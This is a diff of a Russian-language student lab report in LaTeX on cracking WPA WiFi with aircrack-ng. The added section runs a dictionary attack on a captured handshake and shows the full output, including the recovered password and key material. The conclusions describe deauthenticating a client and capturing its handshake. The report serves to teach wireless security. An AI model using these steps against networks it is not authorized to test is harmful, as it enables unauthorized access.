@@ -176,12 +176,6 @@ a connected wireless client (-c <client's mac>).
 \end{verbatim}
 
 
-
-%---------------------------------------------------------
-
-\subsection{}
-
-
 В результате перехватываем пакет handshake:
 
 \begin{verbatim}
@@ -197,6 +191,54 @@ BSSID              STATION            PWR   Rate    Lost  Packets  Probes
 
 1C:7E:E5:39:26:F8  74:E5:43:65:15:F5  -32    0e- 1      0      645  18   
 \end{verbatim}
+
+%---------------------------------------------------------
+
+\subsection{Произвести взлом используя словарь паролей}
+
+Так как используемый пароль слишком сложный, в некоторую часть словаря был вставлен искомый пароль.
+
+\begin{verbatim}
+crazy-mini alex # aircrack-ng dump-05.cap -w English.dic 
+Opening dump-05.cap
+Read 20931 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  1C:7E:E5:39:26:F8  18                        WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening dump-05.cap
+Reading packets, please wait...
+
+                                 Aircrack-ng 1.1
+
+
+                   [00:01:51] 91444 keys tested (845.44 k/s)
+
+
+                         KEY FOUND! [ execombat112 ]
+
+
+      Master Key     : CB A9 50 ED 43 34 9F 6E C1 CD 22 48 71 3C 21 F3 
+                       7D 11 CE BF 37 E0 B4 62 CE 4B EC 03 32 DB 47 B1 
+
+      Transient Key  : 9B 6F B4 1A E5 6C E0 96 13 BD CB 53 47 F5 E6 AE 
+                       74 18 DC B4 6B 74 CE AF CD 52 B1 E8 A3 00 73 B8 
+                       43 D3 84 3B C2 74 7C 4E BE 74 3B A5 80 5D 4F 92 
+                       25 8C 45 86 45 97 1A 41 E6 58 18 9E 94 FE 1C BB 
+
+      EAPOL HMAC     : 23 38 A3 41 34 98 88 00 4C 73 54 67 39 E9 DB 87 
+
+
+%---------------------------------------------------------
+
+\section{Выводы}
+
+В ходе данной лабораторной работы был рассмотрен AirCrack с такими его уилитами, как: airmon-ng, airodump-ng, aireplay-ng и aircrack-ng.
+ 
+Произведен мониоринг на беспроводном инерфейсе, ослеживающий аутентификации в сети, а также осуществлена деаутентификация одного из клиентов и перехвачен введенный им пароль. В итоге осуществден взлом, посредсвом словаря паролей.
 
 
 
